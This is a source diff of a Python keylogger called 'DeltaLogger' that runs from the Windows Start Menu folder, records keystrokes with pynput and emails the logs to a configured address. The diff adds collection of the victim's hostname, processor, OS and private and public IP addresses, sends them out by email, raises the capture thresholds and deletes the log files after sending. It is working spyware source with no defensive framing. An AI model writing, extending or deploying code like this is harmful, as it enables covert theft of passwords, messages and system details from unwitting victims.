@@ -1,4 +1,4 @@
-# WELCOME TO DELTALOGGER!
+# HELLO FROM DELTALOGGER!
 
 # Libraries
 
@@ -12,13 +12,22 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 from pynput.keyboard import Key, Listener
+import socket
+import platform
+import getpass
+from json import load
+from urllib.request import urlopen
+
 
 # Variables
 username = getpass.getuser()
 logs = "logs.txt"
+system_information = "system_info.txt"
 file_path = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\"
 extend = "\\"
-toaddr = "mail to send to" # Put the mail you would like to send logs to, suggest the same mail as the sender.
+toaddr = "mail to send to"
+
+# Put the mail you would like to send logs to, suggest the same mail as the sender.
 # So logs will be stored here and you don't have to login to another mail to view logs
 
 # Sending Mails Function
@@ -79,12 +88,28 @@ def send_email(filename, attachment, toaddr):
     # terminating the session
     s.quit()
 
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        public_ip = load(urlopen("https://api.ipify.org/?format=json"))['ip']
+        
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+        f.write("Public IP Address: " + public_ip + "\n")
+        
+computer_information()
+
+send_email(system_information, file_path + extend + system_information, toaddr)
 
 end = 0  # DON'T CHANGE IT!
 
 # Here you can select the value. If you want the script to run 5 times you put 5, same thing with other numbers like 200 ecc...
-while end < 5:
-    # Suggest 30 with following configuration at line 124
+while end < 30:
+    # Suggest 50 with following configuration at line 124
 
     count = 0
     keys = []
@@ -125,26 +150,26 @@ while end < 5:
     def on_relase(key):
         if key == Key.esc:
             return False
-        if stopper > 80:  # Change the value as you prefer. If you put 30 an email with logs will be sent after 30 characters logged and a new "end" cycle will be started.
-            return False # Suggest 80
+        if stopper > 120:  # Change the value as you prefer. If you put 30 an email with logs will be sent after 30 characters logged and a new "end" cycle will be started.
+            return False # Suggest 120
 
 
     #The keylogger starts
     with Listener(on_press=on_press, on_release=on_relase) as listener:
         listener.join()
 
-    if stopper > 80:  # You have to put the same value as upper
+    if stopper > 120:  # You have to put the same value as upper
         send_email(logs, file_path + extend + logs, toaddr)
         # print("Email Sent!") Commented because the script is in .pyw
         end += 1
 
 # How many seconds do the script need to wait before delete logs.txt.
-time.sleep(40)
+time.sleep(30)
 # This happens only when the scripts finishes his runs. The number of runs is the number you put for "end" cycle.
-delete_files = [logs]
+delete_files = [logs, system_information]
 for file in delete_files:
     os.remove(file_path + extend + file)
+
 # Developed by @Degnato
 # Still in developing
-
-# GOODBYE BY DELTALOGGER!
+# GOODBYE FROM DELTALOGGER!
